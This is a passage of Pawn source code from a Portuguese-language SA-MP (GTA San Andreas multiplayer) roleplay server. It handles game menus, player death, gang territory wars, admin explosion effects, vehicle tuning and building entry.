				        DrawTextForPlayer(playerid, "Você já possui uma arma branca.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
				        goto _menuitem;
				    }

				    DrawTextForPlayer(playerid, "Bengala adquirida", COLOUR_GREEN, TEXTDRAW_STYLE_2, 2000);
				}
				
				case 11: //Soco ingles
				{
				    if(GivePlayerSysWeapon(playerid, 1, 1) == 4)
				    {
				        DrawTextForPlayer(playerid, "Você já possui uma arma branca.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
				        goto _menuitem;
				    }

				    DrawTextForPlayer(playerid, "Soco inglês adquirido", COLOUR_GREEN, TEXTDRAW_STYLE_2, 2000);
				}
			}
			
			GivePlayerSysMoney(playerid, -ItemList[row][itValue]);
		}

_menuitem:
  		ShowMenuForPlayer(Itens, playerid);
		TogglePlayerControllable(playerid, false);
	    return 1;
	}
	
	if(mid == Donuts)
	{
  		if(!GivePlayerFood(playerid, "Donut servido, evite ficar próximo a fogo, para não queimar a rosca -.-'", 40, 5.0, Donuts))
  		{
  		    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0, 1);
  		}
  		
		return 1;
	}
	
	if(mid == Pizzas)
	{
  		if(!GivePlayerFood(playerid, "Pizza servida, bom apetite.", PizzasFlavor[row][foodValue], PizzasFlavor[row][foodHealth], Pizzas))
  		{
  		    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0, 1);
  		}
  		
		return 1;
	}
	
	if(mid == Chickens)
	{
  		if(!GivePlayerFood(playerid, "Comida servida, bom apetite.", ChickensFlavor[row][foodValue], ChickensFlavor[row][foodHealth], Chickens))
  		{
  		    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0, 1);
  		}
  		
		return 1;
	}
	
	if(mid == Burgers)
	{
  		if(!GivePlayerFood(playerid, "Sanduiche servido, bom apetite.", BurgersFlavor[row][foodValue], BurgersFlavor[row][foodHealth], Burgers))
  		{
  		    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0, 1);
  		}
  		
		return 1;
	}
	
	if(mid == Foods)
	{
		if(!GivePlayerFood(playerid, "Comida servida, bom apetite.", Food[row][foodValue], Food[row][foodHealth], Foods))
		{
		    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.00, 0, 0, 0, 0, 0, 1);
		}

		return 1;
	}
	
	if(mid == Drinks)
	{
		if(!GivePlayerFood(playerid, "Bebida servida.", Drink[row][drinkValue], 0.0, Menu:INVALID_MENU))
		{
		    new msg[128];
		    
		    DrinkSips[playerid] = 10;
		    SetPlayerSpecialAction(playerid, Drink[row][drinkAction]);
		    format(msg, sizeof msg, "Para beber pressione ~y~%s", GetKeyName(K_DRINK, 1));
		    DrawTextForPlayer(playerid, msg, COLOUR_WHITE, TEXTDRAW_STYLE_2, 3000);
		}
		
		InRestaurant[playerid] = 0;
		return 1;
	}
	
	if(mid == Restaurant)
	{
		switch(row)
		{
		    case 0: ShowMenuForPlayer(Foods, playerid);
		    case 1: ShowMenuForPlayer(Drinks, playerid);
		}
		
		TogglePlayerControllable(playerid, false);
		return 1;
	}
	
	return 1;
}

stock GivePlayerFood(playerid, const message[], value, Float:health, Menu:menu)
{
    if(IsValidMenu(menu))
	{
	    ShowMenuForPlayer(menu, playerid);
  		TogglePlayerControllable(playerid, false);
	}
	
	else
	    TogglePlayerControllable(playerid, true);
	    
	if(GetPlayerSysMoney(playerid) < value)
	{
	    DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		return 1;
	}
	
	else
	{
		AddPlayerSysHealth(playerid, health);
		GivePlayerSysMoney(playerid, -value);
		SendClientMessage(playerid, COLOUR_LIGHT_YELLOW, message);
	}

	return 0;
}

public OnPlayerExitedMenu(playerid)
{
	new Menu:mid;

	mid = GetPlayerMenu(playerid);

    if(mid == mTuning)
	{
	    if(TuneData[3] == -1 && TuneData[4] == -1)
	    {
	        StopTuning();
	        return 1;
		}
		
	    if(TuneData[4] != -1)
	    {
	        new comp;

			comp = GetVehicleComponent(TuneData[1], TuneData[3]);
			    
			if(TuneData[3] == PAINTJOBS)
			{
			    RemoveVehiclePaintjob(TuneData[1]);
			    
			    if(comp != 0xFF)
					ChangeVehiclePaintjob(TuneData[1], comp);
			}
			
			else
			{
			    RemoveVehicleComponent(TuneData[1], TuneData[4]);
			    
			    if(comp != 0xFF)
					AddVehicleComponent(TuneData[1], comp);
			}
			
	        TuneData[4] = -1;
	    }
	    
	    else if(TuneData[3] != -1)
	        TuneData[3] = -1;
	   
	    UpdateTuningMenu();
     	return 1;
	}
	
	if(mid == Guns[0])
	{
	    SetCameraBehindPlayer(playerid);
		TogglePlayerControllable(playerid, true);
		return 1;
	}
	
	for(new g = 1; g < sizeof Guns; g++)
	{
	    if(mid == Guns[g])
	    {
	        ShowMenuForPlayer(Guns[0], playerid);
			TogglePlayerControllable(playerid, false);
			return 1;
	    }
	}
	
	if(mid == Restaurant)
	    InRestaurant[playerid] = 0;

	if(InRestaurant[playerid] == 1)
	{
	    ShowMenuForPlayer(Restaurant, playerid);
	    TogglePlayerControllable(playerid, false);
		return 1;
	}
	
	if(mid == Bank[1])
	{
		BankOpc[playerid] = 0;
		ShowMenuForPlayer(Bank[0], playerid);
		TogglePlayerControllable(playerid, false);
		return 1;
	}
	
	BankOpc[playerid] = 0;
	TogglePlayerControllable(playerid, true);
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	if(Dying[playerid] != 0)
	{
	   	Fall(playerid, false);
	    return;
	}
	
    new pxpath[128], pkpath[128];
    new pgang, ppost;
	new Float:X, Float:Y, Float:Z, Float:A;
	
	pxpath = GetPlayerXFilePath(playerid);
	pkpath = GetPlayerKFilePath(playerid);
	GetPlayerGangData(playerid, pgang, ppost);
	GetPlayerPos(playerid, X, Y, Z);
	GetPlayerFacingAngle(playerid, A);
	SavePlayerWeapons(playerid);

	if(killerid != INVALID_PLAYER_ID)
	{
	    if(GetPlayerState(killerid) == PLAYER_STATE_DRIVER)
	    {
	        if(!IsPlayerAdmin(killerid))
	        {
	        	new string[128];
	        
	        	SendClientMessage(playerid, COLOUR_RED, "--> Você foi kickado do servidor por Drive-by Kill (matar alguém dirigindo).");
	        	format(string, sizeof string, "%s foi kickado do servidor. Motivo: Drive-by Kill", PlayerName(killerid));
	        	SendClientMessageToAll(COLOUR_RED, string);
	        	Kick(killerid);
			}
		}
		
		else
		{
	    	new kxpath[128], kkpath[128];
	    	new kgang, kpost, kzone;
	    
	    	kxpath = GetPlayerXFilePath(killerid);
			kkpath = GetPlayerKFilePath(killerid);
			kzone = Zone[killerid];
			GetPlayerGangData(killerid, kgang, kpost);
	
			if(Weapons[reason][wSkill] != -1)
			{
			    new skill_key[128], cur_level;

			    format(skill_key, sizeof skill_key, "SkillLevel%d", Weapons[reason][wSkill]);
			    cur_level = hGetInt(kkpath, skill_key);

			    if(cur_level != MAX_SKILL_LEVEL)
			    {
			        cur_level += 20;

			    	if(cur_level > MAX_SKILL_LEVEL)
						cur_level = MAX_SKILL_LEVEL;

		        	hSetInt(kkpath, skill_key, cur_level);
		        	SetPlayerSkillLevel(killerid, reason, cur_level);
				}
			}
		
			if(kzone != -1 && kgang != 0 && pgang != 0 && kgang != pgang)
			{
			    if(GetZoneDomain(kzone) == pgang)
			    {
			        if(GangZones[kzone][gzAttacker] == 0)
			        {
						DeleteTimer(GangZones[kzone][gzTimer]);
						GangZoneFlashForAll(GangZones[kzone][gzId], COLOUR_RED);
						GangZones[kzone][gzAttacker] = kgang;
						GangZones[kzone][gzScore] = 0;
						GangZones[kzone][gzTimer] = SetTimerEx("GangZoneWar", 5000, true, "d", kzone);
				
						for(new n = 0; n < MAX_SLOTS; n++)
						{
						    if(IsPlayerConnected(n) && IsPlayerLogged(n) && Zone[n] == kzone)
								UpdatePlayerZoneText(n);
						}

						SendClientMessage(killerid, COLOUR_SKY_BLUE, "Você iniciou um ataque neste território, mantenha-se nele para conclui-lo.");
					}
					
					else if(GangZones[kzone][gzAttacker] == kgang)
					{
					    if(ppost == GANG_POST_LEADER)
					    {
					        SetZoneDomain(kzone, kgang);
					        FinishWar(kzone);
					    }
					}
			    }
			    
			    else if(GetZoneDomain(kzone) == kgang)
			    {
					if(ppost == GANG_POST_LEADER)
			        	FinishWar(kzone);
			    }
			}
			
			if(Pouch[playerid] != -1)
			{
			    new string[128];
	    		new pay;

	    		pay = 300 + random(201);
	    		
	    		if(hGetInt(kxpath, "Job") == JOB_DRUG_DEALER)
	    		    Pay(killerid, pay);
	    		    
				else
					GivePlayerSysMoney(killerid, pay);
					
                Pouch[playerid] = -1;
				GivePlayerSysMoney(playerid, -100);
				format(string, sizeof string, "Dinheiro do malote roubado, você recebeu $%d,00 dólares.", pay);
				SendClientMessage(killerid, COLOUR_DRUG_DEALER, string);
				SendClientMessage(playerid, COLOUR_SECURITY, "Transporte do malote falhou, você foi morto...");
				SendClientMessage(playerid, COLOUR_SECURITY, "Você perdeu $100,00 dólares pela perda do malote.");
			}
		}
	}

	new speak;

	speak = random(3);

	if(speak == 0)
		Speak(playerid, "Ahh, I'm down!");
		
	if(speak == 1)
	    Speak(playerid, "I cannot fight anymore, ohh...");
	    
	if(speak == 2)
	    Speak(playerid, "I just cannot resist...");

	for(new gun = 0; gun < 4; gun += 2)
	{
		if(pWeapons[playerid][gun] > 0 && pWeapons[playerid][gun] < sizeof Weapons && pWeapons[playerid][gun+1] != 0)
		{
	    	if(Weapons[pWeapons[playerid][gun]][wObjectId] != 0)
     		{
    	    	new id;
				new Float:startX, Float:startY, Float:dwX, Float:dwY, Float:dwZ, Float:dwA;

				dwA = A + random(180) - 90;
				startX = X + 0.2 * floatsin(-dwA, degrees);
				startY = Y + 0.2 * floatcos(-dwA, degrees);
				dwX = startX + 0.8 * floatsin(-dwA, degrees);
				dwY = startY + 0.8 * floatcos(-dwA, degrees);
				dwZ = Z - 0.95;
		
				id = CreateDroppedWeapon(pWeapons[playerid][gun], pWeapons[playerid][gun+1], startX, startY, Z, 270.0, 0.0, float(random(360)));
				MoveObject(DroppedWeapons[id][dwObjectId], dwX, dwY, dwZ, 4.1);
			}
		
			pWeapons[playerid][gun] = pWeapons[playerid][gun+1] = 0;
		}
	}

	if(pWeapons[playerid][4] > 0 && pWeapons[playerid][4] < sizeof Weapons)
	{
	    if(Weapons[pWeapons[playerid][4]][wObjectId] != 0)
     	{
	    	new id;
			new Float:startX, Float:startY, Float:dwX, Float:dwY, Float:dwZ, Float:dwA;

			dwA = A + random(180) - 90;
			startX = X + 0.2 * floatsin(-dwA, degrees);
			startY = Y + 0.2 * floatcos(-dwA, degrees);
			dwX = startX + 0.8 * floatsin(-dwA, degrees);
			dwY = startY + 0.8 * floatcos(-dwA, degrees);
			dwZ = Z - 0.95;

			id = CreateDroppedWeapon(pWeapons[playerid][4], 1, startX, startY, Z, 270.0, 0.0, float(random(360)));
			MoveObject(DroppedWeapons[id][dwObjectId], dwX, dwY, dwZ, 4.1);
		}
		
		pWeapons[playerid][4] = 0;
	}

    for(new cop = 0; cop < MAX_SLOTS; cop++)
	{
		if(IsPlayerConnected(cop) && IsPlayerLogged(cop) && HoldId[cop] == playerid)
		{
		    ClearAnimations(playerid);
	        HoldId[cop] = -1;
			PlayerEvent[cop] &= ~PLAYER_EVENT_HOLDING;
		}
	}
	
	if(TestPlayerT == playerid)
	{
	    TestPlayerT = INVALID_PLAYER_ID;
	    TestPartT = 0;
	    TestChancesT = 0;
	    DeleteTimer(TestTimerT);
	    SendClientMessage(playerid, COLOUR_RED, "[AUTO ESCOLA] Você falhou no seu teste.");
	}

	if(TestPlayerN == playerid)
	{
	    TestPlayerN = INVALID_PLAYER_ID;
	    TestPartN = 0;
	    SendClientMessage(playerid, COLOUR_RED, "[AUTO ESCOLA] Você falhou no seu teste.");
	}

	if(TestPlayerA == playerid)
	{
	    TestPlayerA = INVALID_PLAYER_ID;
	    TestPartA = 0;
	    SendClientMessage(playerid, COLOUR_RED, "[AUTO ESCOLA] Você falhou no seu teste.");
	}
	
	if(HoldId[playerid] != -1)
	{
	    ClearAnimations(HoldId[playerid]);
		HoldId[playerid] = -1;
		PlayerEvent[playerid] &= ~PLAYER_EVENT_HOLDING;
	}
	
	if(Call[playerid] != 0)
	{
	    new xpath[128];
     	new callerid, payerid, credits;

	    callerid = Call[playerid] >> 2;

    	if(CallCost[playerid] > 0)
		    payerid = playerid;

		else
		    payerid = callerid;

		xpath = GetPlayerXFilePath(payerid);
		credits = hGetInt(xpath, "Credits") - CallCost[payerid];
		callerid = Call[playerid] >> 2;
		Call[playerid] = 0;
		Call[callerid] = 0;
		SendClientMessage(playerid, COLOUR_WHITE, "[ Chamada finalizada ]");
		SendClientMessage(callerid, COLOUR_WHITE, "[ Chamada finalizada ]");
		StopPlayerCellPhoneAction(playerid);
		StopPlayerCellPhoneAction(callerid);

		if(credits < 0)
  			credits = 0;

        hSetInt(xpath, "Credits", credits);
		if(payerid != playerid)
		{
			new string[128];
			format(string, sizeof string, "[ Foram gastos $%d,00 dólares em créditos. Total: $%d,00 dólares ]", CallCost[payerid], credits);
  			SendClientMessage(payerid, COLOUR_WHITE, string);
		}

		CallCost[payerid] = 0;
		DeleteTimer(CallTimer[payerid]);
	}
	
	HideTextGray(playerid);
	HideTextRed(playerid);
	Dying[playerid] = ((GetPlayerInterior(playerid) & 0xFFFF) << 8) | ((GetPlayerVirtualWorld(playerid) + 1) & 0xFFFF);
	Limp[playerid] = 0;
	Rob[playerid] = 0;
	SetSpawnInfo(playerid, 0, hGetInt(pxpath, "Skin"), X, Y, Z, A, 0, 0, 0, 0, 0, 0);
}

stock AttachPlayerHandgun(playerid)
{
	new Float:offX, Float:offY, Float:offZ, Float:offR;
	
	RemovePlayerAttachedObject(playerid, OBJECT_SLOT_HANDGUN);
	
    if(Weapons[pWeapons[playerid][0]][wObjectId] != 0 && pWeapons[playerid][1] > 0 && GetPlayerWeapon(playerid) != pWeapons[playerid][0])
	{
	    if(pWeapons[playerid][0] == 27)
	        offX = -0.2, offY = -0.155, offZ = 0.075, offR = 35.0;

		else if(pWeapons[playerid][0] == 29)
			offX = -0.08, offY = -0.155, offZ = -0.02, offR = 30.0;
			
		else if(pWeapons[playerid][0] == 35)
		    offX = 0.15, offY = -0.165, offZ = -0.1, offR = 30.0;
		
		else
			offX = -0.05, offY = -0.165, offZ = 0.05, offR = 36.0;

		SetPlayerAttachedObject(playerid, OBJECT_SLOT_HANDGUN, Weapons[pWeapons[playerid][0]][wObjectId], 1, offX, offY, offZ, 0.0, offR, 0.0);
	}
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
    for(new cop = 0; cop < MAX_SLOTS; cop++)
	{
		if(IsPlayerConnected(cop) && IsPlayerLogged(cop) && HoldId[cop] == playerid)
			return 0;
	}
				
	if(Dying[playerid] != 0 || Limp[playerid] == 1)
	    return 0;
	    
	if(IsPlayerAdmin(playerid) && AdminData[playerid][admPower] == 1)
	{
	    new Float:X, Float:Y, Float:Z, Float:A;
	    
	    GetPlayerPos(playerid, X, Y, Z);
	    GetPlayerFacingAngle(playerid, A);

		if(oldkeys & K_POWER)
		{
			if(newkeys & K_ATTACK1)
			{
		        ApplyAnimation(playerid, "FIGHT_C", "FightC_M", 4.1, 0, 1, 1, 1, -1, 1);
		        
		        for(new d = 0; d < 8; d++)
		        	SetTimerEx("CreateExplosionT", d * 225 + 100, false, "fffdf", X + float((d * 10) + 15) * floatsin(-A, degrees), Y + float((d * 10) + 15) * floatcos(-A, degrees), Z, 1, 100.0);
		        
		        SetTimerEx("StopAnimation", 2000, false, "d", playerid);
			}
		
			if(newkeys & K_ATTACK2)
			{
			    ApplyAnimation(playerid, "FIGHT_C", "FightC_Spar", 4.1, 0, 1, 1, 1, -1, 1);

		    	for(new i = 0; i < 6; i++)
		    	{
		    	    new rand;
		    	    
		    	    rand = random(3);
		    	    
					if(rand == 0)
					{
		    			SetTimerEx("CreateExplosionT", i * 1000 + 250, false, "fffdf", X, Y, Z + 20.0, 6, 100.0);
		    			SetTimerEx("CreateExplosionT", i * 1000 + 500, false, "fffdf", X, Y, Z - 20.0, 6, 100.0);
		    			SetTimerEx("CreateExplosionT", i * 1000 + 750, false, "fffdf", X + 15.0 * floatsin(-A, degrees), Y + 15.0 * floatcos(-A, degrees), Z, 6, 100.0);
		    			SetTimerEx("CreateExplosionT", i * 1000 + 1000, false, "fffdf", X - 15.0 * floatsin(-A, degrees), Y - 15.0 * floatcos(-A, degrees), Z, 6, 100.0);
					}
					
					if(rand == 1)
					{
						SetTimerEx("CreateExplosionT", i * 1000 + 250, false, "fffdf", X + 15.0 * floatsin(-(A + 90), degrees), Y + 15.0 * floatcos(-(A + 90), degrees), Z + 2 - i, 6, 100.0);
		    			SetTimerEx("CreateExplosionT", i * 1000 + 500, false, "fffdf", X - 15.0 * floatsin(-(A + 90), degrees), Y - 15.0 * floatcos(-(A + 90), degrees), Z + 2 - i, 6, 100.0);
            	    	SetTimerEx("CreateExplosionT", i * 1000 + 750, false, "fffdf", X + 15.0 * floatsin(-(A - 90), degrees), Y + 15.0 * floatcos(-(A - 90), degrees), Z - 2 + i, 6, 100.0);
		    			SetTimerEx("CreateExplosionT", i * 1000 + 1000, false, "fffdf", X - 15.0 * floatsin(-(A - 90), degrees), Y - 15.0 * floatcos(-(A - 90), degrees), Z - 2 + i, 6, 100.0);
					}
					
					if(rand == 2)
					{
						SetTimerEx("CreateExplosionT", i * 1000 + 250, false, "fffdf", X + 15.0 * floatsin(-(A + 45), degrees), Y + 15.0 * floatcos(-(A + 45), degrees), Z + 2 - i, 6, 100.0);
		    			SetTimerEx("CreateExplosionT", i * 1000 + 500, false, "fffdf", X - 15.0 * floatsin(-(A + 45), degrees), Y - 15.0 * floatcos(-(A + 45), degrees), Z + 2 - i, 6, 100.0);
            	    	SetTimerEx("CreateExplosionT", i * 1000 + 750, false, "fffdf", X + 15.0 * floatsin(-(A - 45), degrees), Y + 15.0 * floatcos(-(A - 45), degrees), Z - 2 + i, 6, 100.0);
		    			SetTimerEx("CreateExplosionT", i * 1000 + 1000, false, "fffdf", X - 15.0 * floatsin(-(A - 45), degrees), Y - 15.0 * floatcos(-(A - 45), degrees), Z - 2 + i, 6, 100.0);
					}
				}
			
				SetTimerEx("StopAnimation", 6250, false, "d", playerid);
			}
			
			if(newkeys & K_ATTACK3)
			{
                ApplyAnimation(playerid, "FIGHT_C", "FightC_3", 4.1, 0, 1, 1, 1, -1, 1);
                SetTimerEx("CreateExplosionT", 500, false, "fffdf", X + 5.0 * floatsin(-(A + 10.0), degrees), Y + 5.0 * floatcos(-A, degrees), Z + 0.5, 4, 100.0);
            	SetTimerEx("CreateExplosionT", 500, false, "fffdf", X + 5.0 * floatsin(-(A - 10.0), degrees), Y + 5.0 * floatcos(-A, degrees), Z + 0.5, 4, 100.0);
				SetTimerEx("CreateExplosionT", 500, false, "fffdf", X + 5.0 * floatsin(-A, degrees), Y + 5.0 * floatcos(-A, degrees), Z + 0.5, 5, 100.0);
                SetTimerEx("StopAnimation", 1500, false, "d", playerid);
                
			}

			if(newkeys & K_ATTACK4)
			{
                ApplyAnimation(playerid, "FIGHT_C", "FightC_block", 4.1, 0, 1, 1, 1, -1, 1);
                
                for(new n = 0; n < MAX_SLOTS; n++)
                {
                    if(IsPlayerConnected(n) && IsPlayerLogged(n) && n != playerid)
                    {
                        new Float:PX, Float:PY, Float:PZ;
                        
                        GetPlayerPos(n, PX, PY, PZ);
                        
                        if(GetDistance(X, Y, Z, PX, PY, PZ) < 50.0)
                        {
							for(new e = 0; e < 8; e++)
								SetTimerEx("CreateExplosionT", e * 225 + 100, false, "fffdf", PX, PY, PZ + ((4 - e) * 2.0), 10, 100.0);
						}
                    }
                }
                
                SetTimerEx("StopAnimation", 1000, false, "d", playerid);
			}
		}
	}
	
	if(newkeys & K_SPEAK && Radio[playerid] != -1)
	{
	    DeleteTimer(SpeakTimer[playerid]);
	    SpeakId[playerid] = (SpeakId[playerid] + 1) % sizeof Speaks;
	    SpeakTimer[playerid] = SetTimerEx("SpeakRadio", 2000, false, "dd", playerid, SpeakId[playerid]);
  		TextDrawSetString(tdspeak[playerid], Speaks[SpeakId[playerid]]);
		TextDrawShowForPlayer(playerid, tdspeak[playerid]);
		return 0;
	}
	
	if(newkeys & K_VEHICLE && VFrozenFlags[playerid] != 0)
	{
	    TogglePlayerControllable(playerid, true);
	    TextDrawHideForPlayer(playerid, tdvehicle);
	    RemovePlayerFromVehicle(playerid);
	    return 1;
	}
	
	if(PressedKey(K_DRINK, newkeys, oldkeys) && GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_NONE && Dying[playerid] == 0 && Limp[playerid] == 0)
	{
	    new action;
	    
	    action = GetPlayerSpecialAction(playerid);
	    
	    if(action == SPECIAL_ACTION_DRINK_SPRUNK || action == SPECIAL_ACTION_DRINK_BEER || action == SPECIAL_ACTION_DRINK_WINE)
	    {
			if(DrinkSips[playerid] > 0)
			{
			    if(action == SPECIAL_ACTION_DRINK_SPRUNK)
			    {
			        if(pDrunk[playerid] < GetPlayerDrunkLevel(playerid))
			            pDrunk[playerid] = GetPlayerDrunkLevel(playerid);
			            
					pDrunk[playerid] -= 2000;
					
					if(pDrunk[playerid] < 0)
					    pDrunk[playerid] = 0;
					    
					SetPlayerDrunkLevel(playerid, pDrunk[playerid]);
			    }
			    
			    DrinkSips[playerid]--;
			    AddPlayerSysHealth(playerid, 1.0);
			}
			
			if(DrinkSips[playerid] == 0)
			    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	    }
	}
	
	if(PressedKey(K_SMOKE, newkeys, oldkeys) && GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_SMOKE_CIGGY)
	{
	    if(Cigar[playerid] > 0)
	    {
			Cigar[playerid]--;
	        AddPlayerSysHealth(playerid, 3.0);
	        SetPlayerWeather(playerid, Weathers[CurrentWeather][wWeatherId]);
	        SetPlayerCounter(playerid, COUNTER_DRUG, 20);
	    }
	    
	    if(Cigar[playerid] == 0)
	        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	}
	
	if(PressedKey(K_ROB, newkeys, oldkeys) && Rob[playerid] != 0)
	{
	    new safe, rob;

		rob = Rob[playerid] & 0x7FFFFF;
		safe = Rob[playerid] >> 24;
		
		if(rob > 0)
		{
		    Pay(playerid, rob);
			Safes[safe][sMoney] -= rob;
			
			if(Safes[safe][sMoney] < 0)
			    Safes[safe][sMoney] = 0;
		}
		
		Rob[playerid] = 0;
		DrawTextForPlayer(playerid, "Assalto concluído.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 3000);
	}
	
	if(PressedKey(K_WEAPON, newkeys, oldkeys) && DroppedWeapon[playerid] != -1)
	{
		new id, res;
		
		id = DroppedWeapon[playerid];
		res = GivePlayerSysWeapon(playerid, DroppedWeapons[id][dwWeaponId], DroppedWeapons[id][dwAmmo]);

		if(res == 0)
		{
		    DeleteDroppedWeapon(id);
		    ApplyAnimation(playerid, "CARRY", "putdwn05", 4.1, 0, 1, 1, 1, -1, 1);
		    SetTimerEx("StopAnimation", 1000, false, "d", playerid);
		}
		
		if(res == 1)
		    DrawTextForPlayer(playerid, "Você já possui o número máximo de cartuchos.", COLOUR_RED, TEXTDRAW_STYLE_3, 1000);

		if(res == 2)
		    DrawTextForPlayer(playerid, "Você já possui uma arma pesada.", COLOUR_RED, TEXTDRAW_STYLE_3, 1000);

		if(res == 3)
		    DrawTextForPlayer(playerid, "Você já possui uma arma leve.", COLOUR_RED, TEXTDRAW_STYLE_3, 1000);

		if(res == 4)
		    DrawTextForPlayer(playerid, "Você já possui uma arma branca.", COLOUR_RED, TEXTDRAW_STYLE_3, 1000);
			
		return 1;
	}
	
	if(PressedKey(K_MODSHOP, newkeys, oldkeys))
	{
	    if(Area[playerid] == AREA_MOD_SHOP)
	    {
	        new vehid, modelid, rand;
            new Float:VX, Float:VY, Float:VZ;
            
			if(TuneData[0] != INVALID_PLAYER_ID)
			{
			    DrawTextForPlayer(playerid, "Virtual Shop ocupada.", COLOUR_RED, TEXTDRAW_STYLE_3, 1000);
			    return 1;
			}
			
			if(!IsPlayerInAnyVehicle(playerid))
			{
		    	DrawTextForPlayer(playerid, "Você não está em um veículo.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		    	return 1;
			}
			
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
			{
		    	DrawTextForPlayer(playerid, "Você deve estar dirigindo.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		    	return 1;
			}

	    	if(VFrozenFlags[playerid] != 0)
	    	{
	        	DrawTextForPlayer(playerid, "Você deve estar desparalisado.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		    	return 1;
	    	}

			vehid = GetPlayerVehicleID(playerid);

			if(IsServerVehicle(vehid) || IsVehicleForSale(vehid))
			{
		    	DrawTextForPlayer(playerid, "Você não pode modificar um veículo do servidor.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		    	return 1;
			}

			if(!IsPlayerAdmin(playerid) && strcmp(hGetString(GetVehicleFilePath(vehid), "Owner"), PlayerName(playerid), true) != 0)
			{
		    	DrawTextForPlayer(playerid, "Você não pode modificar um veículo de outro jogador.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		    	return 1;
			}
		
		    modelid = GetVehicleModel(vehid);

			if(	modelid == 509 || modelid == 581 || modelid == 481 || modelid == 462 || modelid == 521 || modelid == 463 || modelid == 510 ||
				modelid == 522 || modelid == 461 || modelid == 448 || modelid == 468 || modelid == 586 || modelid == 523 || modelid == 520 ||
				modelid == 435 || modelid == 450 || modelid == 591 || modelid == 606 || modelid == 607 || modelid == 610 || modelid == 584 ||
				modelid == 608 || modelid == 611 || modelid == 472 || modelid == 473 || modelid == 493 || modelid == 595 || modelid == 484 ||
				modelid == 453 || modelid == 452 || modelid == 446 || modelid == 454 || modelid == 539 || modelid == 538 || modelid == 537 ||
				modelid == 590 || modelid == 569 || modelid == 570 || modelid == 449 || modelid == 441 || modelid == 464 || modelid == 594 ||
	 			modelid == 501 || modelid == 465 || modelid == 564	)
			{
			    DrawTextForPlayer(playerid, "Modelo inválido para modificação.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
	    		return 1;
			}
		
		    TuneData[0] = playerid;
		    TuneData[1] = vehid;
		    TuneData[2] = modelid;
		    TuneData[3] = -1;
		    TuneData[4] = -1;
		    GetVehiclePos(vehid, VX, VY, VZ);

  			for(new n = 0; n < MAX_SLOTS; n++)
  			{
				if(IsPlayerConnected(n) && IsPlayerLogged(n) && n != playerid && IsPlayerInVehicle(n, vehid))
				{
			    	new Float:A;

				    A = float(random(360));
				    SetPlayerPos(n, VX + 5.0 * floatsin(-A, degrees), VY + 5.0 * floatcos(-A, degrees), VZ);
				}
			}
		
		    rand = random(3);
		    
		    if(rand == 0)
		        PlayAudioStreamForPlayer(playerid, "http://dc433.4shared.com/img/1066640177/50fb51e8/dlink__2Fdownload_2Fzq_5FEqIEu_3Ftsid_3D20120110-025710-492da849/preview.mp3");
		        
			else if(rand == 1)
			    PlayAudioStreamForPlayer(playerid, "http://dc231.4shared.com/img/1066651083/5410addc/dlink__2Fdownload_2FNQ3BSZDR_3Ftsid_3D20120110-025458-b8f9cb3f/preview.mp3");

			else
			    PlayAudioStreamForPlayer(playerid, "http://dc149.4shared.com/img/1066628614/d0136c1e/dlink__2Fdownload_2FKiESR6bB_3Ftsid_3D20120110-025838-8199bf92/preview.mp3");
           
			SetPlayerInterior(playerid, 1);
    		LinkVehicleToInterior(vehid, 1);
			SetPlayerPos(playerid, 608.7222, -24.7236, 1000.9203);
			SetPlayerFacingAngle(playerid, 0.0);
			SetVehiclePos(vehid, 615.0339, -3.8868, 1001.0250);
			SetVehicleZAngle(vehid, 270.2918);
			TogglePlayerControllable(playerid, false);
	        ShowTuningMainMenu();
	        return 1;
	    }
	}
	
    if(PressedKey(K_ENTER, newkeys, oldkeys) && Window[playerid][wndOn] == 0)
	{
		if(Door[playerid] != -1)
		{
		    new int;

			int = Enters[Door[playerid]][intId];

            TextDrawHideForPlayer(playerid, tdjoin);
			SetPlayerInterior(playerid, Ints[int][intInt]);
			SetPlayerPos(playerid, Ints[int][intX], Ints[int][intY], Ints[int][intZ]);
			SetPlayerVirtualWorld(playerid, Enters[Door[playerid]][enterVirtualWorld]);
			Enter[playerid] = Door[playerid];
			Door[playerid] = -1;
			OnPlayerEnterPlace(playerid, Enter[playerid], int);
			return 1;
		}

		if(Enter[playerid] != -1)
		{
		    new int, prev, enter;
			new Float:X, Float:Y, Float:Z;

            int = Enters[Enter[playerid]][intId];
            enter = Enter[playerid];
            prev = Enter[playerid] + Enters[Enter[playerid]][enterPrev];
			GetPlayerPos(playerid, X, Y, Z);

			if(GetDistance(X, Y, Z, Ints[int][intX], Ints[int][intY], Ints[int][intZ]) > 2.5)
			    return 1;

            TextDrawHideForPlayer(playerid, tdexit);
			SetPlayerInterior(playerid, Enters[Enter[playerid]][enterInt]);
			SetPlayerPos(playerid, Enters[Enter[playerid]][enterX], Enters[Enter[playerid]][enterY], Enters[Enter[playerid]][enterZ]);

			if(prev > -1 && prev != Enter[playerid] && prev < sizeof Enters)
			{
				SetPlayerVirtualWorld(playerid, Enters[prev][enterVirtualWorld]);
				Enter[playerid] = prev;
			}
			
			else
			{
			    SetPlayerVirtualWorld(playerid, 0);
			    Enter[playerid] = -1;
			}
			
			OnPlayerExitPlace(playerid, enter, int);
			return 1;
		}
		
		if(House[playerid] != -1)
		{
		    new hpath[128];
